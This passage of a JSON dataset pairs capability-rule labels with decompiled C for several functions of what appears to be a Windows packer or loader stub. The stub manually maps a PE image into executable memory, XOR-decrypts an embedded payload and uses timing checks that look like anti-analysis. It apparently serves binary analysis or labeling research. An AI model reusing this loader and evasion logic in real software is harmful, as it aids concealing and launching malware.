{
    "00402647": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00402647(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    ushort uVar4;\n    uint extraout_ECX;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t *piVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    uint arg_ch;\n    uint uVar10;\n    uint uVar11;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    piVar7 = *(param_1 + 0x3c) + param_1;\n    if ((*piVar7 == 0x4550) || ((*(param_1 + 10) & 0x11) == 0x111)) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, piVar7[0x14], 0x1000, 0x40);\n        if (iVar2 == 0) {\n            uVar10 = 0x40164c;\n            uVar11 = extraout_ECX;\n            fcn.004024ca(0x40164c);\n            arg_ch = 10;\n            uVar11 = (*_sym.imp.KERNEL32.dll_GetLastError)(10, uVar10, uVar11);\n            fcn.00402463(uVar11, arg_ch);\n            return 0;\n        }\n        (**0x406020)(iVar2, param_1, piVar7[0x15]);\n        var_10h = *(piVar7 + 6);\n        if (var_10h != 0) {\n            var_4h = piVar7 + *(piVar7 + 5) + 0x24;\n            var_ch = *(piVar7 + 5) + 0x2c + piVar7;\n            puVar8 = piVar7 + *(piVar7 + 5) + 0x28;\n            do {\n                if (*var_ch != 0) {\n                    (**0x406020)(*var_4h + iVar2, *var_ch + param_1, *puVar8);\n                }\n                var_ch = var_ch + 10;\n                var_4h = var_4h + 10;\n                puVar8 = puVar8 + 10;\n                var_10h = var_10h - 1;\n            } while (var_10h != 0);\n        }\n        iVar9 = *(iVar2 + 0x3c) + iVar2;\n        var_10h = iVar9;\n        iVar3 = fcn.00403565();\n        if (0x7fff < iVar3 - *0x406040) {\n            return 0;\n        }\n        iVar3 = *(iVar9 + 0xa4);\n        if (iVar3 != 0) {\n            var_ch = iVar2 - *(iVar9 + 0x34);\n            piVar7 = *(iVar9 + 0xa0) + iVar2;\n            for (; iVar3 != 0; iVar3 = iVar3 - *piVar6) {\n                iVar9 = *piVar7;\n                piVar6 = piVar7 + 1;\n                piVar7 = piVar7 + 2;\n                for (iVar5 = *piVar6 + -8; iVar5 != 0; iVar5 = iVar5 + -2) {\n                    var_4h = *piVar7 >> 0xc;\n                    if (var_4h != NULL) {\n                        if (var_4h != 0x3) {\n                            uVar11 = 0x401660;\n                            goto code_r0x00402890;\n                        }\n                        piVar1 = (*piVar7 & 0xfff) + iVar9 + iVar2;\n                        *piVar1 = *piVar1 + var_ch;\n                    }\n                    piVar7 = piVar7 + 2;\n                }\n                iVar9 = var_10h;\n            }\n        }\n        if (*(iVar9 + 0x84) == 0) {\n            return iVar2;\n        }\n        piVar7 = *(iVar9 + 0x80) + iVar2;\n        if (piVar7 == NULL) {\n            return iVar2;\n        }\n        while( true ) {\n            iVar9 = piVar7[3];\n            if (iVar9 == 0) {\n                return iVar2;\n            }\n            iVar3 = fcn.00403565();\n            if (0x7fff < iVar3 - *0x406040) {\n                return 0;\n            }\n            iVar9 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar9 + iVar2);\n            if (iVar9 == 0) break;\n            var_ch = piVar7[4] + iVar2;\n            for (piVar6 = *piVar7 + iVar2; iVar3 = *piVar6,  iVar3 != 0; piVar6 = piVar6 + 1) {\n                puVar8 = NULL;\n                if (iVar3 < 0) {\n                    uVar4 = *piVar6;\n                }\n                else {\n                    var_4h = iVar2 + 2 + iVar3;\n                    var_8h._0_2_ = (**0x406018)(var_4h);\n                    uVar4 = 0;\n                    puVar8 = &var_8h;\n                    var_8h._2_2_ = var_8h;\n                }\n                var_10h = 0;\n                (**0x406038)(iVar9, puVar8, uVar4, &var_10h);\n                if (var_10h == 0) {\n                    uVar11 = 0x401680;\n                    goto code_r0x00402890;\n                }\n                *var_ch = var_10h;\n                var_ch = var_ch + 1;\n            }\n            piVar7 = piVar7 + 5;\n        }\n        uVar11 = 0x401670;\n    }\n    else {\n        uVar11 = 0x40163c;\n    }\ncode_r0x00402890:\n    fcn.004024ca(uVar11);\n    return 0;\n}\n",
        "token_count": 1403
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    code *pcVar8;\n    code *pcVar9;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint extraout_ECX_01;\n    int32_t extraout_ECX_02;\n    int32_t extraout_ECX_03;\n    int32_t extraout_ECX_04;\n    int32_t extraout_ECX_05;\n    int32_t extraout_ECX_06;\n    int32_t extraout_ECX_07;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int16_t *arg_8h;\n    int32_t *piVar12;\n    int32_t in_FS_OFFSET;\n    uint uVar13;\n    int16_t *piVar14;\n    uint uStack2192;\n    uint32_t uStack2188;\n    code *pcStack2184;\n    int32_t iStack2180;\n    uint uStack2172;\n    uint32_t uStack2164;\n    int32_t iStack2160;\n    int32_t iStack2156;\n    uint32_t uStack2152;\n    uint uStack2148;\n    uint uStack2144;\n    uint uStack2140;\n    code *pcStack2132;\n    int32_t iStack2128;\n    uint32_t uStack2124;\n    int32_t iStack2120;\n    code *pcStack2116;\n    uint32_t uStack2112;\n    uint uStack2104;\n    uint32_t uStack2100;\n    uint uStack2084;\n    uint uStack2080;\n    uint uStack2076;\n    int16_t aiStack2060 [4];\n    int16_t aiStack2052 [4];\n    uchar auStack2044 [2040];\n    \n    iVar11 = 0;\n    uStack2192 = 0;\n    pcStack2132 = NULL;\n    iStack2180 = 0;\n    iStack2128 = 0;\n    uStack2124 = 0;\n    fcn.00402342();\n    (**0x40602c)(*(*(*(in_FS_OFFSET + 0x18) + 0x30) + 0xa0));\n    pcVar9 = _sym.imp.KERNEL32.dll_GetTickCount;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    uStack2152 = 3;\n    if ((uVar2 & 0x11) == 0x111) {\n        uStack2164 = 0;\n        uStack2188 = 0;\n        pcVar9 = NULL;\n        goto code_r0x00402949;\n    }\n    *0x406040 = (*pcVar9)();\n    uStack2188 = 0;\n    uStack2164 = 0;\n    pcVar8 = pcStack2184;\ncode_r0x00402a07:\n    iVar3 = fcn.00403565();\n    uVar2 = (iVar3 - *0x406040) % 3;\n    if ((iVar3 - *0x406040 & 0xffff8000U) == 0) {\n        fcn.00402512();\n        iVar3 = fcn.00403565();\n        uVar2 = (iVar3 - *0x406040) % 3;\n        if ((iVar3 - *0x406040 & 0xffff8000U) == 0) {\n            iVar3 = fcn.004034c9();\n            pcVar9 = _sym.imp.KERNEL32.dll_GetCommandLineW;\n            piVar12 = iVar3 + 0xfe0;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)(0x401390);\n            iVar5 = (**0x406008)(uVar4);\n            iStack2180 = (iVar5 != 0) << 0x18;\n            if (iVar5 != 0) {\n                uVar4 = (*pcVar9)(0x40124c);\n                iVar5 = (**0x406008)(uVar4);\n                if (iVar5 == 0) goto code_r0x00402aa5;\n                cVar1 = fcn.00403216();\n                if (cVar1 == '\\0') goto code_r0x004031e2;\n            }\n            else {\ncode_r0x00402aa5:\n                if ((*piVar12 != 0x696d7678) || (*(iVar3 + 0xfe4) != 0x74636a6e)) {\n                    piVar12 = NULL;\n                }\n            }\n            pcVar9 = _sym.imp.KERNEL32.dll_MapViewOfFile;\n            if (piVar12 == NULL) {\n                iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, aiStack2060, 0x3fc);\n                if ((iVar3 != 0) && (iVar3 != 0x3fc)) {\ncode_r0x00402d34:\n                    if ((aiStack2052[0] == 0x5c) && (aiStack2052[1] == 0x5c)) {\n                        arg_8h = aiStack2052;\n                    }\n                    else {\n                        (**0x406020)(aiStack2060, 0x401690, 8);\n                        arg_8h = aiStack2060;\n                    }\n                    iVar3 = fcn.00403565();\n                    uVar2 = iVar3 - *0x406040;\n                    uVar10 = uVar2 % 3;\n                    pcVar8 = pcStack2184;\n                    if ((uVar2 & 0xffff8000) == 0) {\n                        piVar14 = arg_8h;\n                        fcn.004024ca(arg_8h);\n                        uVar13 = 0x401480;\n                        uVar4 = extraout_ECX_01;\n                        fcn.004024ca(0x401480);\n                        iStack2160 = (*_sym.imp.KERNEL32.dll_CreateFileW)\n                                               (arg_8h, 0x80000000, 7, 0, 3, 0, 0, uVar13, uVar4, piVar14, uVar2);\n                        if (iStack2160 != -1) goto code_r0x00402de0;\n                        uVar4 = 0x401488;\n                        iVar3 = extraout_ECX_02;\n                        goto code_r0x00403186;\n                    }\n                    pcVar9 = pcStack2184;\n                    if (uVar10 != 0) goto joined_r0x00402da0;\n                    goto code_r0x00403167;\n                }\n                uVar4 = 0x40146c;\n                iVar3 = extraout_ECX_00;\n                goto code_r0x00403186;\n            }\n            iVar5 = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(piVar12[6], 6, 0, 0, 0);\n            if (iVar5 == 0) {\n                uVar4 = 0x4013e0;\n                iVar3 = extraout_ECX;\n            }\n            else {\n                iVar3 = 0;\n                iVar11 = iVar5;\n                iVar6 = (*pcVar9)(*(iVar5 + 0x1c), 6, 0, 0);\n                iStack2128 = iVar6;\n                if (iVar6 != 0) {\n                    if (*(iVar6 + 0x48) < 0x3fc) {\n                        (**0x406020)(auStack2044, *(iVar6 + 0x4c) + iVar6, *(iVar6 + 0x48) * 2);\n                        aiStack2052[*(iVar6 + 0x48)] = 0;\n                        iVar3 = 0;\n                        iStack2156 = 0;\n                        if ((*(iVar5 + 0x40) == 0) || (*(iVar5 + 0x44) == 0)) {\n                            if (uStack2192._3_1_ == '\\0') goto code_r0x00402b79;\n                            uVar4 = 0x401430;\n                        }\n                        else {\n                            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, *(iVar5 + 0x40) * 2 + 2);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                            if (iVar3 == 0) {\n                                uVar4 = 0x40141c;\n                            }\n                            else {\ncode_r0x00402b79:\n                                if ((*(iVar5 + 0x50) == 0) || (*(iVar5 + 0x54) == 0)) {\n                                    if (uStack2172._3_1_ == '\\0') goto code_r0x00402bbc;\n                                    uVar4 = 0x401458;\n                                }\n                                else {\n                                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, *(iVar5 + 0x50) * 2 + 2);\n                                    iStack2156 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                                    if (iStack2156 != 0) {\ncode_r0x00402bbc:\n                                        iVar5 = *(*(*(in_FS_OFFSET + 0x18) + 0x30) + 0x10);\n                                        if (iVar3 != 0) {\n                                            (**0x406020)(iVar3, *(iVar11 + 0x44) + iVar11, *(iVar11 + 0x40) * 2);\n                                            *(iVar3 + *(iVar11 + 0x40) * 2) = 0;\n                                            (**0x406034)(iVar5 + 0x38, iVar3);\n                                        }\n                                        if (iStack2156 != 0) {\n                                            (**0x406020)(iStack2156, *(iVar11 + 0x54) + iVar11, *(iVar11 + 0x50) * 2);\n                                            iVar5 = iVar5 + 0x40;\n                                            *(iStack2156 + *(iVar11 + 0x50) * 2) = 0;\n                                            (**0x406034)(iVar5, iStack2156);\n                                            uVar4 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)(iStack2156);\n                                            (**0x406000)(uVar4);\n                                            puVar7 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n                                            if (puVar7 != NULL) {\n                                                (**0x40601c)(&uStack2124, 0, 8);\n                                                iVar5 = (**0x406030)(&uStack2124, iVar5, 1);\n                                                if (iVar5 < 0) {\n                                                    *puVar7 = 0;\n                                                }\n                                                else {\n                                                    (**0x406010)(puVar7, iStack2120);\n                                                }\n                                            }\n                                        }\n                                        cVar1 = fcn.0040350a();\n                                        if (cVar1 != '\\0') {\n                                            iVar5 = fcn.004034c9();\n                                            uVar2 = *(iVar5 + 0x20);\n                                            if ((*(iVar5 + 0x24) == 0) && (uVar2 < 0x7fff0000)) {\n                                                if (iVar3 != 0) {\n                                                    *(uVar2 + 0x68) = iVar3;\n                                                    *(uVar2 + 0x6c) = 0;\n                                                    *(uVar2 + 0x60) = *(iVar11 + 0x40) * 2;\n                                                    *(uVar2 + 0x62) = (*(iVar11 + 0x40) + 1) * 2;\n                                                }\n                                                if (iStack2156 != 0) {\n                                                    *(uVar2 + 0x78) = iStack2156;\n                                                    *(uVar2 + 0x7c) = 0;\n                                                    *(uVar2 + 0x70) = *(iVar11 + 0x50) * 2;\n                                                    *(uVar2 + 0x72) = (*(iVar11 + 0x50) + 1) * 2;\n                                                }\n                                            }\n                                        }\n                                        goto code_r0x00402d34;\n                                    }\n                                    uVar4 = 0x401444;\n                                }\n                            }\n                        }\n                        goto code_r0x004031dd;\n                    }\n                    fcn.004024ca(0x401408);\n                    iVar3 = 10;\n                    uVar2 = *(iVar6 + 0x48);\n                    goto code_r0x00403194;\n                }\n                uVar4 = 0x4013f4;\n            }\n            goto code_r0x00403186;\n        }\n    }\n    goto code_r0x00402eb4;\ncode_r0x00402de0:\n    iVar3 = fcn.00403586();\n    if (iVar3 == 0) {\n        iVar5 = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)(iStack2160, 0, 2, 0, 0, 0);\n        if (iVar5 == 0) {\n            uVar4 = 0x4014d4;\n            iVar3 = extraout_ECX_03;\n            goto code_r0x00403186;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(iVar5, 4, 0, 0, 0x1000);\n        if (iVar3 == 0) {\n            uVar4 = 0x4014e8;\n            iVar3 = extraout_ECX_04;\n            goto code_r0x00403186;\n        }\n        uVar2 = fcn.00402567();\n        (*_sym.imp.KERNEL32.dll_UnmapViewOfFile)();\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetFileSizeEx)(uStack2164, &uStack2152);\n        if (iVar6 == 0) {\n            uVar4 = 0x4014fc;\n            goto code_r0x00403186;\n        }\n        if ((iStack2120 < (0xffffefff < uVar2)) ||\n           ((iStack2120 <= (0xffffefff < uVar2) && (uStack2124 <= uVar2 + 0x1000)))) {\n            fcn.004024ca(0x401510);\n            fcn.00402463(pcStack2132, 10);\n            fcn.004024ca(0x401480);\n            iVar3 = 10;\n            goto code_r0x00403194;\n        }\n        uStack2192 = uVar2 + 0x1000;\n        iVar6 = 0;\n        pcVar8 = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(uStack2144, 4, 0, 0);\n        if (pcVar8 == NULL) {\n            uVar4 = 0x401524;\n            iVar3 = extraout_ECX_05;\n            goto code_r0x00403186;\n        }\n        iVar3 = fcn.00403565();\n        uVar2 = (iVar3 - *0x406040) % 3;\n        pcStack2184 = pcVar8;\n        if ((iVar3 - *0x406040 & 0xffff8000U) != 0) {\ncode_r0x00402eb4:\n            pcVar9 = pcVar8;\n            if (uVar2 != 0) goto joined_r0x00402ebf;\ncode_r0x00403167:\n            iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)(iStack2160, 0, 2, 0, 0, 0);\n            if (iVar3 != 0) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack2160);\n                (*pcStack2184)(pcStack2132, iVar3, uStack2152, uStack2148, iStack2180, iVar11, uStack2140);\n                return;\n            }\n            uVar4 = 0x4015d8;\n            iVar3 = extraout_ECX_07;\ncode_r0x00403186:\n            fcn.004024ca(uVar4);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(10);\ncode_r0x00403194:\n            fcn.00402463(uVar2, iVar3);\ncode_r0x004031e2:\n            uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x4015f8, 0x4015ec);\n            pcVar9 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n            (*pcVar9)(0, 0x406048, 0x401610, 0x10);\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0xffffffff);\n            pcVar9 = swi(3);\n            (*pcVar9)();\n            return;\n        }\n        iVar11 = fcn.00402567();\n        piVar12 = pcVar8 + iVar11;\n        if (*piVar12 == 0x6d7678) {\n            if (piVar12[1] == 3) {\n                uVar2 = piVar12[2] * 0x8088405 + 1;\n                if ((uVar2 ^ piVar12[2]) == piVar12[3]) {\n                    uVar10 = uVar2 * 0x8088405 + 1;\n                    if ((uVar10 ^ uVar2) == piVar12[4]) {\n                        uVar10 = uVar10 * 0x8088405 + 1;\n                        uStack2188 = piVar12[5] ^ uVar10;\n                        uStack2164 = piVar12[6] ^ uVar10 * 0x8088405 + 1;\n                        iVar11 = piVar12 + 6 + (0xc - pcVar8);\n                        (*_sym.imp.KERNEL32.dll_UnmapViewOfFile)(pcVar8);\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(uStack2172);\n                        iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)(iVar5, 0, 8, 0, 0, 0);\n                        if (iVar3 == 0) {\n                            uVar4 = 0x401578;\n                            goto code_r0x00403186;\n                        }\n                        pcVar9 = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(iVar3, 1, 0, 0, uStack2164 + iVar11);\n                        if (pcVar9 == NULL) {\n                            uVar4 = 0x40158c;\n                            iVar3 = extraout_ECX_06;\n                            goto code_r0x00403186;\n                        }\n                        pcStack2132 = pcVar9 + iVar11;\n                        pcVar8 = pcStack2132;\n                        for (uVar10 = uStack2164; uVar10 != 0; uVar10 = uVar10 - 1) {\n                            uVar2 = uVar2 * 0x343fd + 0x269ec3;\n                            *pcVar8 = *pcVar8 ^ uVar2 >> 0x10;\n                            pcVar8 = pcVar8 + 1;\n                        }\n                        uStack2084 = 0;\n                        uStack2080 = 0;\n                        uStack2076 = 0;\n                        uStack2112 = 0;\n                        pcStack2116 = NULL;\n                        iVar11 = iVar6;\n                        iVar3 = fcn.00403720(pcVar8, pcVar8);\n                        pcStack2184 = pcVar9;\n                        if (iVar3 == 0) {\ncode_r0x00402949:\n                            do {\n                                while( true ) {\n                                    uVar4 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, uStack2188, 0x1000, 4);\n                                    iVar3 = fcn.00403565();\n                                    uVar10 = (iVar3 - *0x406040) % uStack2152;\n                                    pcVar8 = pcStack2184;\n                                    if ((iVar3 - *0x406040 & 0xffff8000U) == 0) break;\n                                    if (uVar10 == 0) goto code_r0x00403167;\njoined_r0x00402da0:\n                                    pcStack2184 = pcVar8;\n                                    if (uVar10 == 1) goto code_r0x00402a07;\n                                }\n                                uStack2112 = uStack2164;\n                                pcStack2116 = pcStack2132;\n                                uStack2100 = uStack2188;\n                                uStack2104 = uVar4;\n                                iVar3 = fcn.00403840();\n                                if (iVar3 != 1) {\n                                    uVar4 = 0x4015b0;\n                                    goto code_r0x004031dd;\n                                }\n                                (*_sym.imp.KERNEL32.dll_UnmapViewOfFile)(pcVar9);\n                                (*_sym.imp.KERNEL32.dll_CloseHandle)(uStack2172);\n                                iVar3 = fcn.00403565();\n                                uVar2 = (iVar3 - *0x406040) % uStack2152;\n                                if ((iVar3 - *0x406040 & 0xffff8000U) == 0) {\n                                    iVar3 = fcn.00402647();\n                                    (*_sym.imp.KERNEL32.dll_VirtualFree)(uVar4, uStack2188, 0x8000);\n                                    if (iVar3 == 0) goto code_r0x004031e2;\n                                    fcn.0040352d();\n                                    iVar3 = fcn.004025be();\n                                    if (iVar3 == 0) {\n                                        uVar4 = 0x4015c8;\n                                        goto code_r0x004031dd;\n                                    }\n                                    iStack2128 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n                                    goto code_r0x00403167;\n                                }\n                                if (uVar2 == 0) goto code_r0x00403167;\njoined_r0x00402ebf:\n                            } while (uVar2 != 1);\n                            goto code_r0x00402a07;\n                        }\n                        uVar4 = 0x4015a0;\n                    }\n                    else {\n                        uVar4 = 0x401568;\n                    }\n                }\n                else {\n                    uVar4 = 0x401558;\n                }\n            }\n            else {\n                uVar4 = 0x401548;\n            }\n        }\n        else {\n            uVar4 = 0x401538;\n        }\ncode_r0x004031dd:\n        fcn.004024ca(uVar4);\n        goto code_r0x004031e2;\n    }\n    goto code_r0x00402a07;\n}\n",
        "token_count": 5048
    },
    "00403216": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403216(int32_t param_1)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    code *pcVar3;\n    char cVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    int32_t extraout_ECX_02;\n    int32_t iVar12;\n    uint uVar13;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint hEvent;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetCommandLineW;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)(0x40124c);\n    iVar6 = (**0x406008)(uVar5);\n    if (iVar6 != 0) {\n        iVar6 = iVar6 + 0x2a;\n        uVar5 = 0x20;\n        iVar7 = (**0x406004)(iVar6, 0x20);\n        if (iVar7 == 0) {\n            uVar5 = 0x401278;\n        }\n        else {\n            uVar8 = iVar7 - iVar6 >> 1;\n            if (1 < uVar8) {\n                iVar7 = uVar8 * 2;\n                uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7 + 2);\n                iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n                if (iVar9 == 0) {\n                    fcn.004024ca(0x4012a0);\n                    return 0;\n                }\n                (**0x406020)(iVar9, iVar6, iVar7);\n                *(iVar7 + iVar9) = 0;\n                iVar6 = (*_sym.imp.KERNEL32.dll_OpenFileMappingW)(4, 0, iVar9);\n                pcVar2 = _sym.imp.KERNEL32.dll_MapViewOfFile;\n                if (iVar6 == 0) {\n                    uVar5 = 0x4012b4;\n                    iVar11 = extraout_ECX_00;\n                }\n                else {\n                    iVar7 = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(iVar6, 4, 0, 0, 0);\n                    if (iVar7 == 0) {\n                        uVar5 = 0x4012c8;\n                        iVar11 = extraout_ECX_01;\n                    }\n                    else {\n                        (**0x406020)(param_1, iVar7, 0x20);\n                        iVar10 = fcn.0040345d();\n                        if (iVar10 == 0) {\n                            return 0;\n                        }\n                        uVar5 = *(iVar7 + 0x20);\n                        cVar4 = fcn.00403404();\n                        if (cVar4 == '\\0') {\n                            return 0;\n                        }\n                        cVar4 = fcn.00403404();\n                        if (cVar4 == '\\0') {\n                            return 0;\n                        }\n                        iVar11 = (*pcVar2)(*(param_1 + 0x18), 2, 0, 0, 0);\n                        if (iVar11 == 0) {\n                            uVar5 = 0x4012dc;\n                        }\n                        else {\n                            iVar12 = iVar7 + 0x28;\n                            iVar1 = iVar12 + *(iVar7 + 0x24) * 4;\n                            for (; iVar12 != iVar1; iVar12 = iVar12 + 4) {\n                                cVar4 = fcn.00403404();\n                                if (cVar4 == '\\0') {\n                                    return 0;\n                                }\n                            }\n                            iVar12 = (*_sym.imp.KERNEL32.dll_SetEvent)(uVar5);\n                            pcVar2 = _sym.imp.KERNEL32.dll_UnmapViewOfFile;\n                            if (iVar12 != 0) {\n                                (*_sym.imp.KERNEL32.dll_UnmapViewOfFile)(iVar11);\n                                pcVar3 = _sym.imp.KERNEL32.dll_CloseHandle;\n                                (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar5);\n                                (*pcVar3)(iVar10);\n                                (*pcVar2)(iVar7);\n                                (*pcVar3)(iVar6);\n                                uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                                return 1;\n                            }\n                            uVar5 = 0x4012f0;\n                            iVar11 = extraout_ECX_02;\n                        }\n                    }\n                }\n                fcn.004024ca(uVar5);\n                uVar13 = 10;\n                uVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)(10, uVar5, iVar11);\n                fcn.00402463(uVar5, uVar13);\n                return 0;\n            }\n            uVar13 = 0x40128c;\n            fcn.004024ca(0x40128c);\n            uVar5 = (*pcVar2)(extraout_ECX, uVar13, uVar5);\n        }\n        fcn.004024ca(uVar5);\n    }\n    return 0;\n}\n",
        "token_count": 1202
    },
    "004035d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004035d0(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uchar *puVar8;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(param_1 + 0x1c);\n    if (*(iVar1 + 0x34) == 0) {\n        iVar2 = (**(param_1 + 0x20))(*(param_1 + 0x28), 1 << (*(iVar1 + 0x24) & 0x1f), 1);\n        *(iVar1 + 0x34) = iVar2;\n        if (iVar2 == 0) {\n            return 1;\n        }\n    }\n    if (*(iVar1 + 0x28) == 0) {\n        *(iVar1 + 0x30) = 0;\n        *(iVar1 + 0x2c) = 0;\n        *(iVar1 + 0x28) = 1 << (*(iVar1 + 0x24) & 0x1f);\n    }\n    uVar3 = param_2 - *(param_1 + 0x10);\n    uVar6 = *(iVar1 + 0x28);\n    puVar8 = *(iVar1 + 0x34);\n    iVar2 = *(param_1 + 0xc);\n    if (uVar6 <= uVar3) {\n        puVar5 = iVar2 - uVar6;\n        for (; uVar6 != 0; uVar6 = uVar6 - 1) {\n            *puVar8 = *puVar5;\n            puVar8 = puVar8 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        *(iVar1 + 0x2c) = *(iVar1 + 0x28);\n        *(iVar1 + 0x30) = 0;\n        return 0;\n    }\n    uVar6 = uVar6 - *(iVar1 + 0x30);\n    if (uVar3 < uVar6) {\n        uVar6 = uVar3;\n    }\n    puVar8 = puVar8 + *(iVar1 + 0x30);\n    puVar5 = iVar2 - uVar3;\n    for (uVar7 = uVar6; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar8 = *puVar5;\n        puVar8 = puVar8 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = uVar3 - uVar6;\n    if (iVar4 != 0) {\n        puVar8 = *(iVar1 + 0x34);\n        puVar5 = iVar2 - iVar4;\n        iVar2 = iVar4;\n        do {\n            *puVar8 = *puVar5;\n            puVar8 = puVar8 + 1;\n            puVar5 = puVar5 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n        *(iVar1 + 0x30) = iVar4;\n        *(iVar1 + 0x2c) = *(iVar1 + 0x28);\n        return 0;\n    }\n    *(iVar1 + 0x30) = *(iVar1 + 0x30) + uVar6;\n    iVar2 = *(iVar1 + 0x30);\n    if (iVar2 == *(iVar1 + 0x28)) {\n        iVar2 = 0;\n    }\n    *(iVar1 + 0x30) = iVar2;\n    if (*(iVar1 + 0x2c) < *(iVar1 + 0x28)) {\n        *(iVar1 + 0x2c) = *(iVar1 + 0x2c) + uVar6;\n    }\n    return 0;\n}\n",
        "token_count": 900
    },
    "00403720": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
